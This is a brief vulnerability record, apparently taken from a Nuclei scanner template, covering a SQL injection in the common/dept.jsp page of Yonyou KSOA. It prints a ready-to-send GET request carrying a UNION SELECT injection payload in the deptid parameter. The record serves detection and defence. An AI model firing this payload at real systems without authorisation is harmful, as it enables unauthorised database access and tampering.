# Vulnerability: YonYou KSOA common/dept.jsp - SQL injection
**Classification:** CWE-89
**Source:** Nuclei Template (`yonyou-ksoa-dept-sqli.yaml`)

## Description
Yonyou KSOA contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/common/dept.jsp?deptid=1'+UNION+ALL+SELECT+60%2Csys.fn_sqlvarbasetostr(HASHBYTES('MD5'%2C'{{num}}'))--+
```

